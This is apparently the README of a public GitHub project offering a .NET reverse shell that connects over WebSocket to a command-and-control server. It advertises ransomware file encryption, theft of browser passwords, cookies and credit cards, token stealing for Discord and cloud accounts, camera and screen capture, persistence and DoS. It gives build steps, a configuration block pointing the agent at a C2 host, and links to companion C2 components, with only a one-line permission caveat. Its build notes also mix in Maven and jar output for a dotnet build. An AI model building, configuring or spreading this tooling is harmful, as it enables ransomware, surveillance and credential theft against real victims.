# .NET Reverse Shell with WebSocket

This .NET project implements a reverse shell that connects to a command and control server using WebSocket.

## Features

- Remote Shell  
- Upload Files to Command and Control Server  
- Play rick roll on target computer  
- Access Camera  
- Screen Capture  
- Exfiltrate Browser Info (cookies, history, passwords, credit cards, and download history)  
- Encrypt Files (Ransomware)  
- Token Stealing (Discord, AWS, AZURE, GCP, etc)  
- Persistence via Windows Scheduler
- DOS Attack  


## Table of Contents

- [Prerequisites](#prerequisites)
- [Installation](#installation)
- [Usage](#usage)
- [Configuration](#configuration)
- [Security Considerations](#security-considerations)
- [C2 Components](#C2-Components)
- [Contributing](#contributing)

## Prerequisites

Before you begin, ensure you have the following prerequisites:

- Visual Studio Installed

## Installation

1. Clone the repository:

    ```bash
    git clone https://github.com/The-Hustler-Hattab/WebSocketReverseShellDotNet.git
    ```

2. Navigate to the project folder:

    ```bash
    cd WebSocketReverseShellDotNet
    ```

3. Build the project using Maven:

    ```bash
    dotnet build
    ```

## Usage
The project will generate jar with dependencies and exe file.
To use the reverse shell, click on the exe file. The reverse shell will connect to the command and control server and wait for commands.

## Configuration
Configure the reverse shell by editing the utils/constants file. Update the following properties:
```C#
        public const String SERVER_WEBSOCKET_URI = "wss://c2-server.mtattab.com/reverseShellClients";
        public const String SERVER_HTTP_URI = "https://c2-server.mtattab.com";
```


## Security Considerations
Ensure that you have permission to run the reverse shell on the target system.
Use secure connections (e.g., HTTPS) for the command and control server.
Implement additional security measures as needed for your specific use case.

## C2-Components

[C2 UI](https://github.com/The-Hustler-Hattab/c2-ui)  
[C2 Server](https://github.com/The-Hustler-Hattab/C2JavaServer)   
[C2 Java Agent](https://github.com/The-Hustler-Hattab/ReverseShellWebSocketAgent)  
[C2 C# .NET Agent (RECOMMENDED)](https://github.com/The-Hustler-Hattab/WebSocketReverseShellDotNet)

## Contributing
Contributions are welcome! 
Please make a pull request for new features